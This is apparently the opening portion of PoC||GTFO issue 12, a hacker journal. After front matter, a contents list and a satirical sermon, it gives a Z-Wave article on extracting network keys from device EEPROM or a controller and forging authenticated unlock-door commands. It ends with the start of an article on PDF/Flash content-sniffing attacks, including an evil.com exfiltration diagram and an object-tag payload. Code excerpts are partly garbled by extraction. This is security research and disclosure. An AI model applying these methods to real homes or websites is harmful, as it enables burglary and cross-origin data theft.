to be Freely Distributed to all Good Readers, and
to be Freely Copied by all Good Bookleggers.
Это самиздат. Laissez lire, et laissez danser ; ces deux amusements ne feront jamais de mal au monde.
0, $0 USD, £0, 0 RSD, 0 SEK, $50 CAD. pocorgtfo12.pdf. June 18, 2016.Personal Note: We congratulate Meredith L. Patterson and TQ Hirsch on their marriage, which took
place in front of friends and family at Orcas Island on the evening of 11 June 2016. To life!
Legal Note: We lovingly cast this into the public domain of fields without fences. Please read it and share
it as you like, without fear of litigation.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror–don’t merely link!–pocorgtfo12.pdf and our other issues far and wide, so our articles can help fight
the coming robot apocalypse. We like the following mirrors.
https://unpack.debug.su/pocorgtfo/
https://pocorgtfo.hacke.rs/
https://www.alchemistowl.org/pocorgtfo/
http://www.sultanik.com/pocorgtfo/
Technical Note: The polyglot file pocorgtfo12.pdf is valid as a PDF, as a ZIP file, and as an Android
application. You can read all about the polyglot on page 79. To install it on an Android terminal, simply
drop it into /sdcard/ and run the following from the Android shell:
pm install /sdcard/pocorgtfo12.pdf
Cover Art: The image on our cover is known as the Flammarion engraving, having first appeared in
Camille Flammarion’s 19th century book, L’atmosphère : météorologie populaire. We thank its unknown
engraver for inspiring us to take a quick peek, or sometimes a long look, behind the curtain at the edge of
the world.
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper in
Samland, then fold to get a booklet in A4 or Letter size. Secret volcano labs in Canada may use P3 (280 mm
x 430 mm) if they like, folded to make P4. The outermost sheet should be on thicker paper to form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo12.pdf -o pocorgtfo12-book.pdf
Preacherman
Manul Laphroaig
Editor of Last Resort
Melilot
TEXnician
Evan Sultanik
Editorial Whipping Boy
Jacob Torrey
Funky File Supervisor
Ange Albertini
Assistant Scenic Designer Philippe Teuwen
Spirit Animal Guide
Spencer Pratt
and sundry others
21
Lisez Moi!
Neighbors, please join me in reading this thir-
teenth release of the International Journal of Proof
of Concept or Get the Fuck Out, a friendly little col-
lection of articles for ladies and gentlemen of distin-
guished ability and taste in the field of software ex-
ploitation and the worship of weird machines. This
release is given on paper to the fine neighbors of
Montréal.
If you are missing the first twelve issues, we the
editors suggest pirating them from the usual loca-
tions, or on paper from a neighbor who picked up a
copy of the first in Vegas, the second in São Paulo,
the third in Hamburg, the fourth in Heidelberg, the
fifth in Montréal, the sixth in Las Vegas, the seventh
from his parents’ inkjet printer during the Thanks-
giving holiday, the eighth in Heidelberg, the ninth
in Montréal, the tenth in Novi Sad or Stockholm,
the eleventh in Washington, D.C., or the twelfth in
Heidelberg.
We begin on page 4 with a sermon concerning
peak computation, population bombs, and the joy
of peeks and pokes in the modern world by our own
Pastor Manul Laphroaig.
On page 6 we have a Z-Wave Christmas Carol by
Chris Badenhop and Ben Ramsey. They present a
number of tricks for extracting pre-shared keys from
wireless Z-Wave devices, and then show how to use
those keys to join the network.
On page 14, Krzysztof Kotowicz and Gábor
Molnár present Comma Chameleon, weaponize PDF
polyglots to exfiltrate data via XSS-like vulnerabil-
ities. You will never look at a PDF with the same
eyes again, neighbors!
Chris Domas, whom you’ll remember from his
brilliant compiler tricks, has contributed two arti-
cles to this fine release. On page 28, he explains
how to implement M/o/Vfuscator as a Virtual Ma-
chine, producing a few bytes of portable C or as-
sembly and a complete, obfuscated program in the
.data segment.
IBM had JCL with syntax worse than Joss, and
everywhere the language went, it was a total loss! So
dust off your z/OS mainframe and find that ASCI-
I/EBCDIC chart to read Soldier of Fortran’s JCL
Adventure with Network Job Entries on page 32.
What does a cult Brezhnev-era movie have to do
with how exploit code finds its bearings in a Win-
dows process’ address space? Read Exploiting Weak
Shellcode Hashes to Thwart Module Discovery; or,
Go Home, Malware, You’re Drunk! by Mike Myers
and Evan Sultanik on page 57 to find out!
Page 63 begins Alex Ionescu’s article on a De-
viceGuard Mitigation Bypass for Windows 10, esca-
lating from Ring 3 to Ring 0 with complete recon-
struction of all corrupted data structures.
Page 72 is Chris Domas’ second article of this
release. He presents a Turing-complete Virtual Ma-
chine for VIM using only the normal commands,
such as yank, put, delete, and search.
On page 76 you will find a rousing guest ser-
mon Doing Right by Neighbor O’Hara by Andreas
Bogk, against the heresy of “sanitizing” input as a
miracle cure against injection attacks. Our guest
preacher exposes it as fundamentally unneighborly,
and vouchsafes the true faith.
Concluding this issue’s amazing lineup is Are an-
droids polyglots? by Philippe Teuwen on page 79, in
which you get to practice Jedi polyglot mind tricks
on the Android package system. Now these are the
droids we are looking for, neighbors!
–——–
———
—–—–
On page 80, the last page, we pass around the
collection plate. We’re not interested in your dimes,
but we’d love some nifty proofs of concept. And re-
member, one hacker’s “junk hacking” may hold the
nifty tricks needed for another’s treasured exploit!
32
Surviving the Computation Bomb
by Manul Laphroaig
Gather round the campfire, neighbors. Now is the time for a scary story, of the kind that only science can
tell. Vampires may scare children, but it takes an astronomer to scare adults—as anyone who lived through
the 1910 scare of the Earth’s passing through the Halley’s comet’s tail would plainly tell you. After all, they
had it on the best authority 1 that the tail’s cyanogen gas—spectroscopically confirmed by very prominent
bands—would impregnate the atmosphere and possibly snuff out all life on the planet.
But comets as a scare are old and busted, and astronomic spectroscopy is no longer a hot new thing,
prominent bands or no. We can do better.
Imagine that you come home after a strenuous workday, and, after
a nice dinner, sit down to write some code on that fun little project
for your PoCkGTFO submission. Little do you know that you are
contributing to the thing that will doom us all!
You see, neighbors, there is only so much computation possible in
the world. By programming for pleasure, you are taking away from
this non-renewable resource—and, when it runs out, our civilization
will be destroyed.
Think of it, neighbors. Computation was invented by mathemati-
cians, and they tend to imagine infinite resources, like endless tapes
for their model machines, but in reality nothing is inexhaustible.
There is only a finite amount of atoms in the universe—so how could
such a universe hold even one of these infinite tapes? Mathemati-
cians are notorious for being short-sighted, neighbors.
You may think, okay, so there may not be an infinite amount
of computation, but there’s surely enough for everyone? No, neigh-
bors, not when it’s growing exponentially! We may have been safe
when people just wrote programs, but when they started writing pro-
grams to write programs, and programs to write programs to write
programs, how long do you think this unsustainable rush would last?
Have you looked at the size of a “hello world” executable lately? We
are doomed, neighbors, and your little program is adding to that,
too!
Now you may think, what about all these shiny new computers they keep making, and all those bright ads
showing how computers make things better, with all the happy people smiling at you? But these are made
by corporations, neighbors, and corporation would do anything to turn a profit, would they not? Aren’t
they the ones destroying the world anyway? 2 Perhaps the rich and powerful will have stashed some of it
away for their own needs, but there will not be enough for everyone.
Think of the day when computation runs out. The Internet of Things will turn into an Internet of Bricks,
and all the things it will be running by that time, like your electricity, your water, your heat, and so on will
just stop functioning. The self-driving cars will stop. In vain will your smart fridge, previously shunned by
your other devices as the simpleton with the least processor power, call out to its brethren and its mother
factory—until it too stops and gives up its frosty ghost.
1 The New York Times. Your best source for the science of how the world would end most horribly and assuredly real soon
now.
2 Searching the New York Times for this one is left as an exercise to the reader.
4A national mobilization of the senior folks who still remember how
to use paper and drive may save some lives, but “will only provide a
stay of execution.” Nothing could be more misleading to our children
than our present society of affluent computation! 3
To meet the needs of not just individual programmers, but of society
as a whole, requires that we take an immediate action at home and
promote effective action worldwide—hopefully, through change in our
value system, but by compulsion if voluntary methods fail—before our
planet is permanently ruined. 4
No point in beating around the bush, neighbors—computation must
be rationed before it’s too late. We must also control the population of
programmers, or mankind will program itself into oblivion. “The hand
that hefted the axe against the ice, the tiger, and the bear [and] now
fondles the machine gun”—and, we must add, the keyboard—“just as
lovingly” 5 must be stopped.
Uncontrolled programming is a menace. The peeks and pokes can-
not be left to the unguided masses. Governments must step in and Do Something.
Well, maybe the forward-thinking elements in government already are. When industrial nations sign
an international agreement to control software under the same treaty that controls nuclear and chemical
weapon technologies—and then have to explicitly exclude debuggers from it, because the treaty’s definition
of controlled software clearly covers debuggers—something must be going on. When politicians who loudly
profess their commitment to technological progress and education demand to punish makers and sellers of
non-faulty computers—maybe they are only faking ignorance.
When the only “Advanced Placement” computing in high schools means Java and only Java, one starts
to suspect shenanigans. When most of you, neighbors, barely escaped courses that purported to teach pro-
gramming, but in fact looked like their whole point was to turn you away from it—can this be a coincidence?
Not hardly, neighbors, not by a long shot!
Scared yet, neighbors? 6
Garlic against vampires, silver against werewolves, the Elder Sign against sundry star-spawn. The scary
story teaches us that there’s always a hack. So what is ours against those who would take away our PEEK
and our POKE in the name of expert opinions on the whole society’s good?
Perhaps it is this little litany: “Science is the belief in the ignorance of experts.” At the time that Rev.
Feynman composed it, he felt compelled to say, “I think we live in an unscientific age ... [with] a considerable
amount of intellectual tyranny in the name of science.” We wonder what he would have said of our times.
But take heart, neighbors. Experts and sciences of doom come and go; so do killer comets with cyanogen
tails, 7 the imminent Fifth Ice Age, and population bombs. We might survive the computation bomb yet—so
finish that little project of yours without guilt, send it to us, and let its little light shine—in an unscientific
world that needs it.
3 Cf. Paul Erhlich, “The Population Bomb,” 1968, p. xi, which begins with “The battle to feed all of humanity is over. In
the 1970s hundreds of millions of people will starve to death in spite of any crash programs embarked upon now. At this late
date nothing can prevent a substantial increase in the world death rate. . . ” The 1975 edition amended “the 1970s” to “the 1970s
and 1980s,” but—as the newer and more fashionable kinds of school math teach us—never mind the numbers, the idea is the
important thing!
4 Oops, that one was a quote, too. No wonder that story was a best-seller!
5 Ibid., p. xiii
6 If you think that the “non-renewable computation” argument makes no sense, you are absolutely right! But, do the
arguments for “golden keys” in cryptography or for “regulating exploits” make any more sense? No, and they sound just as
scientific to those inclined to believe that actual experts have, in fact, been consulted. And sometimes they even have been, for
a certain definition of experts.
7 But I bet CyanogenMod is in your Android. Coincidence?
53
Carols of the Z-Wave Security Layer; or,
Robbing Keys from Peter to Unlock Paul
by Chris Badenhop and Ben Ramsey
sensor
HUB
E K (Nwk Key)+
CBC-MAC A
1
E EK (DATA)+
CBC-MAC AK (DATA)
2
3.1
3.2
Adeste Fideles
Z-Wave is a physical, network, and application layer
protocol for home automation. It also allows mem-
bers of the disposable income class to feed their zeal
for domestic gadgetry, irrespective of genuine utility.
Z-Wave devices sit in their homes, quietly exchang-
ing sensor reports and actuating in response to user
commands or the environment.
The curious reader may use an SDR to learn
how, when, and what they communicate. Tools
like Scapy-radio (Picod, Lebrun, and Demay) and
EZ-Wave (Hall and Ramsey) demodulate Z-Wave
frames for inspection and analysis. The C++ source
code for OpenZwave is a great place to examine
characteristics of the Z-Wave application layer. Oth-
ers may still prefer to cross-compile OpenZwave to
their favorite target and examine the binary using a
custom disassembler built from ROP gadgets found
in the old shareware binary WOLF3D.EXE.
After tinkering with Z-Wave devices and an
SDR, the stimulated readers will quickly realize that
they can send arbitrary application layer commands
to devices where they are executed. To combat this,
some devices utilize the Z-Wave security layer, which
provides both integrity and confidentiality services
to prevent forgery, eavesdropping, and replay.
The first gospel of the Z-Wave security layer
was presented by Fouladi and Ghanoun at Black
Hat 2013. In it they identified and exploited a re-
mote rekeying vulnerability. In this second gospel
of the Z-Wave security layer, we validate and ex-
tend their analysis of the security layer, identify a
hardware key extraction vulnerability, and provide
open source PoC tools to inject authenticated and
encrypted commands to sleeping Z-Wave devices.
Deck the Home with Boughs of
Z-Wave
This Christmas, Billy Peltzer invests heavily in Z-
Wave home automation. The view of his festive
front porch reveals several of these gadgets. Billy
is a little paranoid after having to defend himself
from hordes of gremlins every Christmas, so he in-
stalls a Z-Wave door lock, which both Gizmo and
he are able to open using a smart phone or tablet.
Billy uses a Z-Wave smart plug to control Christmas
lights around his front window. He programs the
strand of lights to turn on when a Z-Wave PIR (pas-
sive infrared) sensor detects darkness and turn off
again at daylight. This provides a modest amount
of energy savings, which will pay for itself and his
Mogwai-themed ornament investment after approx-
imately 20 years.
The inquisitive reader may wonder if Billy’s front
door is secure. Could a gremlin covertly enter his
home using the Z-Wave application layer proto-
col, or must it instead cannonball through a win-
dow, alerting his dog Barney? Fortunately, sniff-
ing, replaying, or injecting wireless door commands
is fruitless because the door command class imple-
ments the Z-Wave security layer, which is rooted in
cryptography.
Z-Wave cryptography uses symmetric keys to
provide encryption and authentication services to
the application layer. It stores a form of these keys
in nonvolatile memory, so that the device does not
require rekeying upon power loss. Of the five locks
we have examined, the nonvolatile memory is al-
ways located in the inner-facing module, so a grem-
lin would have to destroy a large portion of the Z-
6Wave door lock to extract the key. At that point it
would have physical access to the lock spindle any-
way, making the cryptographic system moot.
Wireless security is enabled on the 5th gener-
ation (i.e., Z-Wave Plus) devices on Billy’s front
porch. Thus, their memory contains the same keys
that keep gremlins from wirelessly unlocking his
door. A gremlin may crack open the outdoor smart
plug or PIR sensor, locate and extract the keys, and
send an authenticated unlock command to the door.
Billy has figuratively left a key under the doormat!
3.3
except that a different 16-byte seed value is used. A
curious reader may want to know what these seeds
are, and any fortuitous reader in possession of a Mi-
CasaVerde controller will be able to tell you.
The MiCasaVerde controller uses an embedded
Linux OS and provides two mechanisms for ex-
tracting a keyfile from its filesystem, located at
/etc/cmh/keys. Using the web interface, one may
download a compressed archive of the controller
state. The archive contains the /etc directory of
the filesystem. Alternatively, a secure shell inter-
face is also provided to remotely explore the filesys-
tem. The MiCasaVerde binary key file (keys) is
exactly 48 bytes and contains all three keys. The
file is ordered with the network key first, the au-
thentication key second, and the encryption key
last. Billy Peltzer’s Z-Wave network controller is a
MiCasaVerde-Edge. In Figure 1, we show the result-
ing key file and dump the values of the keys for his
network (i.e., 0xe97a5631cb5686fa24450eba103f-
945c).
To find the seeds, one must simply decrypt the
authentication and encryption keys using an AES ci-
pher in ECB mode loaded with the network key, and
the resulting gifts will be the authentication and en-
cryption seeds respectively. From our own observa-
tions, the same seed values are recovered from both
3rd and 5th generation Z-Wave devices. Billy’s keys
are used in Figure 2 to recover the seeds. Given the
seed values and a network key, we have a method for
deriving the encryption key and the authentication
key from an extracted network key.
We Three Keys of AES Are
Since Z-Wave security hinges on the security of the
keys, it is important to know how they are stored
and used. Z-Wave encryption and authentication
services are provided by three 128-bit AES keys;
however, the security of an entire Z-Wave network
converges to a single key in the set. Like the three
wise men, only one of them was necessary to deliver
the gifts to Brian of Nazareth. The other two could
have just as well stayed home and added a few ex-
tra camels to haul the gifts. A card would also have
been nice.
The key of keys in this system is the network
key. This key is generated by the Z-Wave network
controller device and is shared with every device re-
quiring cryptographic services. It is used to derive
both the encrypting and signing keys. When a new
device is added to a Z-Wave network, the device may
declare a set of command classes that will be using
security (e.g., the door lock command class) to the
Z-Wave network controller. In turn, the controller
sends the network key to the new device. To provide
a razor-thin margin of opaqueness, this message is
encrypted and signed using a set of three default
keys known by all Z-Wave devices. The default en-
cryption and authentication keys are derived from a
default 128-bit network key of all zeros. If the ad-
herent reader recovers the encryption key from their
device, decrypts sniffed frames, and finds that the
plaintext is not correct, then they should attempt
to use the encryption key derived from the null net-
work key instead. 8
An authentication key is derived from a network
key as follows. Using an AES cipher in ECB-mode,
a 16-byte authentication seed is encrypted using the
network key to derive the authentication key. The
derivation process for the encryption key is identical,
8 unzip
3.4
Away in an EEPROM, No ROM
for Three Keys
Z-Wave devices other than MiCasaVerde controllers
may not have an embedded Linux OS, so where are
the keys stored in these devices? Extracting and an-
alyzing the nonvolatile memory of Billy’s PIR sensor
and doorlock reveal that the network key is stored in
a lowly, unprotected 8-pin SPI EEPROM, which is
external to the proprietary Z-Wave transceiver chip.
In fact, only the network key is stored in the EEP-
ROM, implying that the encryption key and the au-
thentication key are derived upon startup and stored
in RAM.
Unless the device designers hoped to obscure the
key derivation process, the decision to store only
the network key in nonvolatile memory is unclear.
pocorgtfo12.pdf zwave.tar.bz2
7Moreover, it is not clear why the key is found in the
EEPROM rather than somewhere in the recesses of
the proprietary ZW0X01 Z-Wave transceiver mod-
ule, whose implementation details are protected by
an NDA. The transceiver certainly has available
flash memory, and there does not appear to be any-
one who has dumped the ZW0501 5th generation
flash memory yet. Until this issue is fixed, anyone
with an EEPROM programmer and physical access
can acquire this key, derive the other two keys, and
issue authenticated commands to devices. We ex-
tract Billy’s network key by desoldering the EEP-
ROM from the main board of his PIR sensor and use
an inexpensive USB EEPROM programmer (Sign-
stek MiniPRO) to dump the memory to a file.
The circuit board from the PIR sensor is shown
in Figure 3. The ZW0501 transceiver is the large
chip located on the right side of the board (a 3rd
generation system would have a ZW0301). In gen-
eral, the SPI EEPROM is the 8-pin package clos-
est to the transceiver. The reader may validate
that the SPI pins are shared between the EEP-
ROM and transceiver package to be sure. In fact,
the ATMLH436 EEPROM used in a 3rd generation
door lock is not in the MiniPRO schematics library,
so we trace the SPI pin outs of the ZM3102 (i.e.,
the postage-stamp transceiver package) to the SPI
EEPROM to identify its pin layout. We use this
information to select a compatible SOIC8 ATMEL
memory chip that is available in the MiniPRO li-
brary.
We are unable to provide a fixed memory address
of the network key, as it varies among device types.
Even so, because the memory is so empty (>99%
zeros), the key is always easy to find. In all three
of Billy’s Z-Wave devices, the key is within the only
string of at least 16 bytes in memory. The region
of the EEPROM memory of Billy’s PIR sensor con-
taining the same network key follows, with the key
itself starting at address 0x60A0.
1 ~/Downloads / e t c /cmh $ l s
a l e r t s . json
HW_Key
user_data . j s o n . l z o . 1
3 cmh . c o n f
HW_Key2
user_data . j s o n . l z o . 2
devices
keys
user_data . j s o n . l z o . 3
5 d o n g l e . 3 . 8 3 . dump . 0
last_report
user_data . j s o n . l z o . 4
d o n g l e . 3 . 8 3 . dump . 1 PK_AccessPoint
user_data . j s o n . l z o . 5
7 d o n g l e . 3 . 8 3 . dump . 2
servers . conf . default
vera_model
d o n g l e . 3 . 8 3 . dump . 3
sync_kit
wan_failover
9 d o n g l e . 3 . 8 3 . dump . 4
sync_rediscover
zwave_locale
ergy_key
user_data . j s o n . luup . l z o
11 f i r s t _ b o o t
user_data . j s o n . l z o
~/Downloads / e t c /cmh $ xxd . / k e y s
13 0 0 0 0 0 0 0 : e97a 5631 cb56 86 f a 2445 0 eba 103 f 945 c
. zV1 .V . . $E . . . ? . \
0 0 0 0 0 1 0 : 620 d 486 c 6 a65 2122 a f e 1 086 c 79 e6 3740 b . H l j e ! " . . . l y . 7@
15 0 0 0 0 0 2 0 : e e c 9 e f 9 6 a155 a3d3 02 a1 8441 f 5 f 3 7 ea0
. . . . . U . . . . . A. . ~ .
Figure 1 – Keys found in Billy’s MiCasaVerde Edge Controller
1 ~/POCs $ . / g e t S e e d s . . / k e y s / v e r a e d g e _ k e y F i l e
gcry_cipher_open worked
3 g c r y _ c i p h e r _ s e t k e y worked
g c r y _ c i p h e r _ d e c r y p t worked
5 A_K: : 62 0d 48 6 c 6 a 65 21 22 a f e1 8 6 c 79 e6 37 40
A_Seed : : 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55
7 g c r y _ c i p h e r _ d e c r y p t worked
E_K: : e e c9 e f 96 a1 55 a3 d3 2 a1 84 41 f 5 f 3 7 e a0
9 E_Seed : : aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa
Figure 2 – The seeds for the Encryption and Authentication Keys
8Figure 3 – Location of the EEPROM DIP on a 5th gen Z-Wave PIR sensor (Aeotec Multisensor 4)
91 6090:
60 a0 :
3 60 b0 :
60 c0 :
00000000
e97a5631
56001498
42326402
00000000
cb5686fa
eff17275
a8010000
00000000
24450 eba
13 c c 4 2 0 1
00000000
for fragmentation; however, we have yet to observe
a value other than 0x00 in this field. The second
byte provides the command class and, like the ap-
plication layer, is followed by a single command byte
and zero or more bytes of arguments.
ff000001
103 f 9 4 5 c
00000000
00000000
For reference, the segment of memory in Billy’s
door lock containing the network key follows. The
network key starts at address 0x012D.
0110:
2 0120:
0130:
4 0140:
00000000
00000000
31 cb5686
00000000
00000000
00420100
fa24450e
00000000
00000000
00000000
ba103f94
00000000
The application payload is encrypted using the
encryption key and an AES cipher in OFB mode
with a 16-byte block size. OFB mode requires a 16-
byte IV, which is established cooperatively between
the source and destination. The lower 8 bytes of
the IV are generated on request by the destination,
which OpenZwave calls a nonce, and are reported
to the requestor before the encapsulation frame is
sent. The first byte of this 8-byte nonce is what we
referred to as the nonce ID. The upper eight bytes
of the IV are generated by the sender and included
in the encapsulation security frame. When the des-
tination receives the encapsulated frame, it decrypts
the frame using the same cipher setting and key. It
is able to reconstruct the IV using the IV field of the
encapsulated frame and by using the nonce ID field
to search its cache of generated nonces.
00000000
81 e9 7a 56
5 c560000
00000000
To summarize the above, each device contains a
network key, an authentication key, and an encryp-
tion key. The network key is common throughout
the network and is shared with the devices by us-
ing default authentication and encryption keys that
are the same for all 3rd and 5th generation Z-Wave
devices in the world. The authentication and the
encryption key on the device are derived from the
network key and the nonces of all 5s and all As re-
spectively.
3.5
Do You Hear What I Hear? A
Frame, a Frame, Encapsulated in
a Frame, Is Encrypted
Even armed with the keys, the patient reader still
needs to know how to use them. The Z-Wave se-
curity service provides immutable encryption and
authentication through the use of an encapsulation
frame. The encapsulation security frame (shown be-
low) is identified in the first two bytes of the applica-
tion layer payload. The first byte specifies the com-
mand class, and the second provides the command,
where an encapsulated security frame has byte val-
ues of 0x98 and 0x81, respectively. The remainder
of the frame contains the eight upper bytes of the
IV, used for both encryption and signing, the vari-
able length encapsulated and encrypted payload, the
nonce ID, and an 8-byte CMAC (cipher-based mes-
sage authentication code).
EncapsulatedM/MEncrypted
Frame
0x98 0x81
UpperMIV[8]
Frag. Cmd
Cmd
Field class
...
Nonce
ID
CMAC[8]
At a minimum, the frame encapsulated in the
security frame is three bytes. The first byte is used
103.6
Joy to the Home, Encrypted
Traffic is Revealed
Some cautious readers may become anxious when
two automations are having a private conversation
within their dwelling. This is especially true when
one of them is a sensor, and the other is connected
to the Internet. Fear not! Armed with knowledge
of the encapsulation security frame and possession
of the network or encryption key, the triumphant
reader can readily decrypt frames formerly hidden
from them. They will hopefully discover, as we have,
that Z-Wave messages are devoid of sensitive user
information. However, may the vigilant reader be
a sentry to warn us if any future transgressions do
occur in the name of commercialism and Orwellian-
ism.
To aid the holy sentry, we provide the PoC
decryptPCAPNG tool to decrypt Z-Wave encapsu-
lated Z-Wave frames. The user provides the network
or encryption key. The tool assumes the user is cap-
turing Z-Wave frames using either Scapy-radio or
EZ-Wave with an SDR, which sends observed frames
to Wireshark for capture and saving to PCAPNG
files.
3.7
What Frame Is This, Who Laid
to Rest, upon Receiver’s An-
tenna, Did Originate?
Secure Z-Wave devices do not act upon a command
issued in an encapsulation frame unless its CMAC
is validated. Thus, the active reader wishing to do
more than observe encrypted messages requires fur-
ther discourse. Certainly, the gremlin wishing to
open Billy’s front door desires the ability to gener-
ate an authenticated unlock-door command.
The Z-Wave CMAC is derived using the CBC-
MAC algorithm, which encrypts a message using an
AES cipher in CBC mode using a block size of 16
bytes. It uses the same IV as the encryption cipher,
and only the first eight bytes of the resulting 16-
byte digest are sent in the encapsulation frame to be
used for authentication. Instead of creating the di-
gest from the entire security encapsulation frame, a
subset of fields are composed into a variable-length
message. The first four bytes of this message are
always the security command class ID, source ID,
destination ID, and length of the message. The re-
maining portion of the message is the variable length
113.8
encapsulated frame (e.g., an unlock-door command,
including the fragmentation byte) after it has been
encrypted.
Encapsulated / Encrypted
Frame
0x98
Src
ID
Dst
ID
Msg Frag. Cmd
Cmd
len Field class
Bring a Heavy Flamer of Sanc-
tified Promethium, Jeanette, Is-
abella
Knock! Knock! Knock! Open the door for us!
Knock! Knock! Knock! Let’s celebrate!
We wrote OpenBarley as a PoC tool to demon-
strate how Z-Wave security works. Its default en-
capsulated command is to unlock a door lock, but
the user may specify alternative, arbitrary com-
mands. The tool works with the GNURadio Z-Wave
transceiver available in Scapy-radio or EZ-Wave to
inject authenticated and encrypted frames.
The reader must note that battery operated Z-
Wave devices conserve power by minimizing the
time the transceiver is active. When in low-power
mode, a beam frame is required to bring the re-
mote device into a state where it may receive the
application layer frame and transmit an acknowledg-
ment. Scapy-radio and EZ-Wave did not previously
support waking devices with beam frames, so we
have contributed the respective GNURadio Z-Wave
blocks to EZ-Wave to allow this.
...
The recipient of the encapsulation security frame
validates the integrity of the frame using the in-
cluded 8-byte CMAC. It is able to generate its own
CMAC by reconstructing the message to generate
the digest using the available fields in the frame,
the IV, and the authentication key. If the generated
CMAC matches the declared value in the frame,
then the source ID, destination ID, length, and con-
tent of the encapsulated frame are validated. Note
that, since the other fields in the frame are not part
of the CMAC message, they are not validated. If
the generated digest does not match the CMAC in
the frame, the frame is silently discarded.
3.9
It Came! Somehow or Other, It
Came Just the Same!
This Christmas, as we have done, may you, the
blessed reader, extract the network key from the
EEPROM of a Z-Wave device. May you use our
PoCs to send authenticated commands to any other
secured device on your network. May you enlighten
your friends and neighbors, affording them the op-
portunity to sanctify by fire, or with lesser, more
legal means, home automation lacking physical se-
curity in the name of Manion Butler and his holy
mother. May you use our PoCs to watch the au-
tomation for privacy breaches and data mining in
the time to come, and may you brew in peace.
12134
Content Sniffing with Comma Chameleon
by Krzysztof Kotowicz and Gábor Molnár
The nineties. The age of Prince of Bel Air, leg-
gings and boot sector viruses. Boy George left Cul-
ture Beat to start a solo career, NCSA Mosaic was
created, and SQL injection became a thing. Every-
one in the industry was busy blowing the dot-com
bubble with this whole new e-commerce movement
— and then the first browser war started. Browsers
rendered broken HTML pages like crazy to be con-
sidered “better” in the eyes of the users. Web servers
didn’t care enough to specify the MIME types of
resources, and user agents decided that the best
way to keep up with this mess is to start sniffing.
MIME type sniffing, 9 that is. In short, they relied
on heuristics to recognize the file type of the down-
loaded resource, often ignoring what the server said.
If it quacks like an HTML, it must be HTML, you
silly Apache. Such were the 90s.
9 MSDN,
This MIME type sniffing or content sniffing has
obviously led to a new class of web security problems
closely related to polyglots: if one partially controls
the server response in, e.g., an API call response or
a returned document and convinces the browser to
treat this response as HTML, then it’s straightfor-
ward XSS. The attacker would be able to imperson-
ate the user in the context of the given domain: if
it is hosting a web application, an exploit would be
able to read user data and perform arbitrary actions
in the name of the user in the given web application.
In other cases, user content might be interpreted
as other (non-HTML) types, and then, instead of
XSS, content-sniffing vulnerabilities would be per-
mitted for the exfiltration of cross-domain data—
just as bad.
MIME Type Detection in Windows Internet Explorer
Browsermdisplayingmevil.com
<object
type="application/pdf"
data="victim.com/api"
...
>
PDFmreader
insidemthembrowser
vulnerablemAPImURL
victim.com
HTTPmGET
vulnerablemAPImURL
responsemwith
bootstrapmcode
embeddedmPDF
HTTPmGET
targetmURL
withmcookies
targetmURL
exfiltrated data
14
responseHere we focus on PDF-based content-sniffing at-
tacks. Our goal is to construct a payload that turns
a harmless content injection into passive file formats
(e.g., JSON or CSV) into an XSS-equivalent con-
tent sniffing vulnerability. But first, we’ll give an
overview of the field and describe previous research
on content sniffing.
That has improved the situation quite a bit, but
there were still some leftovers from the nineties that
allowed for MIME sniffing exploitation: namely, the
browser plugins.
4.2
4.1
Content Sniffing of Non-plugin
File Types
To exploit a content sniffing vulnerability, the at-
tacker injects the payload into one of the HTTP
responses from the vulnerable origin. In practice,
that origin must serve partially user-controlled con-
tent. This is common for online file hosting appli-
cations (the attacker would then upload a malicious
file) or in APIs like JSONP that reflect the payload
from the URL (attacker then prepares the URL that
would reflect the content in the response).
The first generation of content sniffing exploits
tried to convince the browser that a given piece of
non-HTML content was in fact HTML, causing a
simple XSS.
In other cases, content sniffing can lead to cross-
origin information leakage. A good example of this
is mentioned in Chris Evans’ research 10 and a re-
cent variation on it from Filedescriptor, 11 which are
based on the fact that browsers can be tricked into
interpreting a cross-origin HTML resource as CSS,
and then observe the effects of applying that CSS
stylesheet to the attacker’s HTML document, in or-
der to derive information about the HTML content.
Current browsers implement more secure
content-type detection algorithms or deploy other
protection mechanisms, such as the trust zones
in IE. Web servers also have become much
better at properly specifying the MIME type
of resources.
Additionally, secure HTTP re-
sponse headers 12 are often used to instruct the
user-agent not to perform MIME sniffing on
a resource.
It’s now a de facto standard to
use Content-Type-Disposition: attachment,
X-Content-Type-Options: nosniff and a be-
nign Content-Type whenever the response is totally
user-controlled (e.g., in file hosting applications).
Plugin Content Sniffing
When an HTML page embeds plugin content, it
must explicitly specify the file type (SWF, PDF,
etc.), then the browser must instantiate the given
plugin type regardless of the MIME type returned
by the server for the given resource. 13
Some of those plugins ignore the response head-
ers received when fetching the file and render
the content inline despite Content-Disposition:
attachment
and
X-Content-Type-Options:
nosniff. For plugins that render active content
(e.g, Flash, Silverlight, PDF, etc.) this makes it
possible to read and exfiltrate the content from the
hosting domain over HTTP. If the plugin’s content
is controlled by an attacker and runs in the context
of a domain it was served from, this is essentially
equivalent to XSS, as sensitive content like CSRF
tokens can be retrieved in a session-riding fashion.
This has led to another class of content sniffing
attacks based on plugins. Rosetta Flash 1415 was a
great example of this: making a JSONP API re-
sponse look like a Flash file, so that the attacker-
controlled Flash file can run with the target do-
main’s privileges.
To demonstrate this, let’s see an example attack
site for a vulnerable JSONP API that embeds the
given query string parameter in the response body
without modification:
<o b j e c t
2 t y p e=" a p p l i c a t i o n /x−shockwave−f l a s h "
data=" h t t p : / / example . com/ j s o n p _ a p i ? c a l l b a c k=
CWS[ f l a s h f i l e c o n t e n t s ] ">
10 Chris
Evans, Generic Cross-browser Cross-domain Theft
Cross-origin CSS Attacks Revisited (feat. UTF-16)
12 OWASP, Secure Headers Project
13 HTML5 Standard
14 Michele Spagnuolo, Abusing JSONP with Rosetta Flash
15 Gábor Molnár, Bypassing Same Origin Policy With JSONP APIs and Flash
11 Filedescriptor,
15In this case, the API response would look as be-
low and would be interpreted as Flash content if the
response doesn’t match some constraints introduced
as a mitigation for the Rosetta Flash vulnerability
(we won’t discuss those in detail here):
These are important aspects because most in-
jection contexts where the attack is useful are very
limiting. For example, when injecting into a string
in a JSON file, junk bytes surround the injection
point, as well as the JSON format limitations on the
character set (e.g., encoding quotes and newlines).
Additionally, we wanted to come up with a uni-
